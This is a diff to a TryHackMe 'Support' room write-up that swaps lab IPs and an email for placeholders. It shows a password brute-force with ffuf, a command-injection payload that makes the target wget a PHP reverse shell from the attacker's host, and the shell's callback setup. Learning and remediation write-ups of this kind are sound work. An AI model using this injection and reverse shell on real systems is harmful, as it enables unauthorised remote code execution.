@@ -3,11 +3,22 @@
 
 **Pathway:** *Jr Penetration Tester* | **Section:** *Web Application Vulnerabilities II* | **Challenge:** *[Support](https://tryhackme.com/room/support)*
 
-> **Spoiler warning:** This write-up contains the full exploitation chain, however no flag codes are shown in this write-up!
+> [!IMPORTANT]
+> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
 >
-> **Please note:** The IP addresses shown in this write-up were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe Paris VPN server.
+> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
 >
-> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit).
+> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
+> 
+> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
+>
+> - `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
+> - `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
+> - `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
+>
+> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.
+
+---
 
 ## About TryHackMe
 
@@ -23,8 +34,8 @@ _Can you pentest the platform and escalate your access to achieve RCE on the s
 
 Confirmed lab details used during the walkthrough:
 
-    Target IP: 10.130.162.35
-    Kali tun0 IP: 192.168.129.186
+    Target IP: <TARGET_IP>
+    Kali tun0 IP: <TUN0_IP>
     Attacker working directory: /tmp/VK
 ## Tools Used
 
@@ -47,7 +58,7 @@ Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used)
 The assessment began with an Nmap scan of the target:
 
 ```bash
-nmap -sC -sV -Pn 10.130.162.35
+nmap -sC -sV -Pn <TARGET_IP>
 ```
 
 The scan identified two externally accessible services:
@@ -72,7 +83,7 @@ dirbuster
 The following scan configuration was then entered into the DirBuster interface:
 
 ```text
-Target URL: http://10.130.162.35/
+Target URL: http://<TARGET_IP>/
 Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ```
 
@@ -96,23 +107,23 @@ The discovered endpoints were recorded for further manual inspection and testing
 Browsing to the root of the web application redirected to the login page:
 
 ```text
-http://10.130.162.35/
+http://<TARGET_IP>/
 ```
 
 Inspection of the page content revealed a valid support email address:
 
 ```text
-help@support.thm
+<REDACTED>
 ```
 
 The password field was then fuzzed using `ffuf`. The known email address was supplied in each request, while the `FUZZ` keyword was placed within the password parameter:
 
 ```text
 ffuf -w /usr/share/wordlists/rockyou.txt \
--u http://10.130.162.35/ \
+-u http://<TARGET_IP>/ \
 -X POST \
 -H "Content-Type: application/x-www-form-urlencoded" \
--d "email=help@support.thm&password=FUZZ" \
+-d "email=<REDACTED>&password=FUZZ" \
 -fr "Invalid"
 ```
 
@@ -134,7 +145,7 @@ A response with a different size, word count, status code or redirect behaviour 
 The discovered credential is intentionally redacted:
 
 ```text
-Email: help@support.thm
+Email: <REDACTED>
 Password: <REDACTED>
 ```
 
@@ -284,7 +295,7 @@ To demonstrate full remote code execution, a PHP reverse-shell payload was prepa
 The payload was configured to connect back to the Kali Linux `tun0` interface:
 
 ```text
-192.168.129.186
+<TUN0_IP>
 ```
 
 TCP port `4444` was selected for the reverse-shell connection.
@@ -292,7 +303,7 @@ TCP port `4444` was selected for the reverse-shell connection.
 The relevant callback values within the PHP reverse shell were configured as follows:
 
 ```php
-$ip = '192.168.129.186';
+$ip = '<TUN0_IP>';
 $port = 4444;
 ```
 
@@ -321,13 +332,13 @@ python3 -m http.server 1234
 This made the payload available to the target at:
 
 ```text
-http://192.168.129.186:1234/revshell.php
+http://<TUN0_IP>:1234/revshell.php
 ```
 
 The command-injection vulnerability in the API gateway was then used to download the PHP payload to the target:
 
 ```text
-sys: date | wget http://192.168.129.186:1234/revshell.php -O /tmp/revshell.php
+sys: date | wget http://<TUN0_IP>:1234/revshell.php -O /tmp/revshell.php
 ```
 
 The downloaded payload was executed through a second injected command:
@@ -341,7 +352,7 @@ Once the PHP payload executed, the target connected back to Penelope on the Kali
 Penelope received the reverse-shell session on:
 
 ```text
-192.168.129.186:4444
+<TUN0_IP>:4444
 ```
 
 The resulting session confirmed that the command-injection vulnerability could be escalated into interactive remote code execution on the target server.
@@ -350,7 +361,7 @@ The resulting session confirmed that the command-injection vulnerability could b
 After the PHP reverse-shell payload executed, Penelope received the incoming connection on the Kali Linux `tun0` address:
 
 ```text
-192.168.129.186:4444
+<TUN0_IP>:4444
 ```
 
 Penelope automatically handled the reverse-shell session and provided a more stable interactive shell than a basic Netcat listener.
@@ -436,7 +447,7 @@ These endpoints provided additional areas for manual inspection and testing.
 Inspection of the login page revealed a valid support email address:
 
 ```text
-help@support.thm
+<REDACTED>
 ```
 
 The password field was fuzzed using `ffuf`, and a valid password was discovered.
@@ -546,7 +557,7 @@ A PHP reverse-shell payload was prepared in the Kali Linux working directory:
 The payload was configured to connect back to the Kali Linux `tun0` address:
 
 ```text
-192.168.129.186
+<TUN0_IP>
 ```
 
 A Python HTTP server was started on port `1234` to host the payload:
@@ -559,7 +570,7 @@ python3 -m http.server 1234
 The vulnerable API was then used to download the payload onto the target:
 
 ```text
-sys: date | wget http://192.168.129.186:1234/revshell.php -O /tmp/revshell.php
+sys: date | wget http://<TUN0_IP>:1234/revshell.php -O /tmp/revshell.php
 ```
 
 The payload was executed using:
@@ -581,7 +592,7 @@ penelope -p 4444
 When the payload executed, the target connected back to:
 
 ```text
-192.168.129.186:4444
+<TUN0_IP>:4444
 ```
 
 The resulting Penelope-managed session provided interactive remote command execution on the target.
@@ -619,47 +630,29 @@ This completed the attack chain from initial web enumeration to interactive remo
 
 ## Key Lessons
 
-This room demonstrated how several individually significant weaknesses can be chained together to achieve full system compromise.
-
-The `isITuser` weakness showed that security decisions must not depend on values stored entirely on the client. Hashing a Boolean value did not protect it from modification because the browser user retained complete control over the cookie.
-
-The internal API demonstrated the importance of object-level authorisation. Authentication alone was insufficient because the application did not verify whether the authenticated user was permitted to access the requested user record.
-
-The configuration disclosure showed the danger of exposing secrets within application source code or client-accessible responses. Once the master password was disclosed, the effectiveness of the login controls was substantially reduced.
-
-The inconsistent handling of the `@` character also demonstrated that password-processing logic must be predictable and secure. Silent character removal or transformation can create unexpected authentication bypass conditions.
-
-The command-injection vulnerability was the most serious weakness in the chain. The application attempted to restrict input to date-related commands, but it failed to prevent shell metacharacters such as the pipe character.
-
-Allowing user-controlled input to reach a system shell enabled the execution of arbitrary operating-system commands. This ultimately allowed sensitive file access and the delivery of a reverse-shell payload.
-
-The use of Penelope demonstrated the operational advantage of a dedicated reverse-shell handler. It provided a more manageable interactive session than a basic raw listener and simplified post-exploitation activity.
-
-The overall attack path also reinforced an important penetration-testing principle: seemingly unrelated vulnerabilities can become critical when combined. Weak session trust, broken access control, credential exposure and command injection formed a complete route from unauthenticated access to remote code execution.
+1. This room demonstrated how several individually significant weaknesses can be chained together to achieve full system compromise.
+2. The `isITuser` weakness showed that security decisions must not depend on values stored entirely on the client. Hashing a Boolean value did not protect it from modification because the browser user retained complete control over the cookie.
+3. The internal API demonstrated the importance of object-level authorisation. Authentication alone was insufficient because the application did not verify whether the authenticated user was permitted to access the requested user record.
+4. The configuration disclosure showed the danger of exposing secrets within application source code or client-accessible responses. Once the master password was disclosed, the effectiveness of the login controls was substantially reduced.
+5. The inconsistent handling of the `@` character also demonstrated that password-processing logic must be predictable and secure. Silent character removal or transformation can create unexpected authentication bypass conditions.
+6. The command-injection vulnerability was the most serious weakness in the chain. The application attempted to restrict input to date-related commands, but it failed to prevent shell metacharacters such as the pipe character.
+7. Allowing user-controlled input to reach a system shell enabled the execution of arbitrary operating-system commands. This ultimately allowed sensitive file access and the delivery of a reverse-shell payload.
+8. The use of Penelope demonstrated the operational advantage of a dedicated reverse-shell handler. It provided a more manageable interactive session than a basic raw listener and simplified post-exploitation activity.
+9. The overall attack path also reinforced an important penetration-testing principle: seemingly unrelated vulnerabilities can become critical when combined. Weak session trust, broken access control, credential exposure and command injection formed a complete route from unauthenticated access to remote code execution.
 
 ## Remediation Notes
 
-The `isITuser` cookie should not be used as the authoritative source for privilege decisions. User roles and permissions should be stored server-side and associated with a securely managed authenticated session.
-
-Any client-side session data should be cryptographically signed and validated. However, signed cookies should not replace server-side authorisation checks on protected endpoints.
-
-The internal user API should enforce object-level authorisation for every request. The server must verify both the identity of the requester and whether that user is permitted to access the requested object.
-
-Sequential or predictable identifiers should not be treated as an access-control mechanism. Even where non-predictable identifiers are used, explicit authorisation checks remain necessary.
-
-Configuration files, source code and API responses must not expose passwords, database locations or other sensitive values. Secrets should be stored in protected environment variables or an appropriate secrets-management platform.
-
-Any credentials exposed during development or testing should be rotated immediately. Application logs should also be reviewed to determine whether the credentials were previously accessed or misused.
-
-Password-processing logic should preserve the exact user-supplied password unless a clearly documented normalisation policy is required. Special characters must not be silently removed or altered during authentication.
-
-The date and time feature should be rewritten to use a safe language-level date library rather than invoking operating-system commands.
-
-Where an external executable is genuinely required, the application should call it using a fixed executable path and a structured argument array. User input must never be concatenated into a shell command string.
-
-Shell invocation should be avoided entirely wherever possible. Input allow-listing may provide additional defence, but it should not be relied upon as the primary control where shell interpretation remains possible.
-
-Potential shell metacharacters, including the following, should be rejected as a secondary safeguard:
+* The `isITuser` cookie should not be used as the authoritative source for privilege decisions. User roles and permissions should be stored server-side and associated with a securely managed authenticated session.
+* Any client-side session data should be cryptographically signed and validated. However, signed cookies should not replace server-side authorisation checks on protected endpoints.
+* The internal user API should enforce object-level authorisation for every request. The server must verify both the identity of the requester and whether that user is permitted to access the requested object.
+* Sequential or predictable identifiers should not be treated as an access-control mechanism. Even where non-predictable identifiers are used, explicit authorisation checks remain necessary.
+* Configuration files, source code and API responses must not expose passwords, database locations or other sensitive values. Secrets should be stored in protected environment variables or an appropriate secrets-management platform.
+* Any credentials exposed during development or testing should be rotated immediately. Application logs should also be reviewed to determine whether the credentials were previously accessed or misused.
+* Password-processing logic should preserve the exact user-supplied password unless a clearly documented normalisation policy is required. Special characters must not be silently removed or altered during authentication.
+* The date and time feature should be rewritten to use a safe language-level date library rather than invoking operating-system commands.
+* Where an external executable is genuinely required, the application should call it using a fixed executable path and a structured argument array. User input must never be concatenated into a shell command string.
+* Shell invocation should be avoided entirely wherever possible. Input allow-listing may provide additional defence, but it should not be relied upon as the primary control where shell interpretation remains possible.
+* Potential shell metacharacters, including the following, should be rejected as a secondary safeguard:
 
 ```text
 |
@@ -671,21 +664,17 @@ $
 <
 ```
 
-The web application should run under a dedicated, low-privileged operating-system account with access only to the files and services required for normal operation.
-
-Sensitive files such as `/home/ubuntu/user.txt` should not be readable by the web application service account.
-
-Outbound network access from the web server should be restricted. Egress filtering could prevent or limit reverse-shell connections to attacker-controlled systems.
-
-Security monitoring should be configured to detect suspicious process creation, use of utilities such as `wget`, unexpected PHP execution and outbound connections from the web service.
-
-Application and web server logs should be monitored for traversal strings, manipulated user identifiers, shell metacharacters and anomalous API requests.
+* The web application should run under a dedicated, low-privileged operating-system account with access only to the files and services required for normal operation.
+* Sensitive files such as `/home/ubuntu/user.txt` should not be readable by the web application service account.
+* Outbound network access from the web server should be restricted. Egress filtering could prevent or limit reverse-shell connections to attacker-controlled systems.
+* Security monitoring should be configured to detect suspicious process creation, use of utilities such as `wget`, unexpected PHP execution and outbound connections from the web service.
+* Application and web server logs should be monitored for traversal strings, manipulated user identifiers, shell metacharacters and anomalous API requests.  
 
 Finally, the application should undergo secure code review and penetration testing before deployment. Particular attention should be given to authentication, session management, API authorisation, secret storage and any functionality that interacts with the operating system.
 
 ## Disclaimer
 
-This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.
+This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.
 
 All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.
 
@@ -696,5 +685,5 @@ Never test, scan, exploit or access a system without clear and explicit authoris
 ---
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  
 
-**Powered on ☕ made with ❤️ by [Valikahn](https://github.com/Valikahn)**  
+**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
 ⭐ If this project is useful, consider starring it on GitHub.
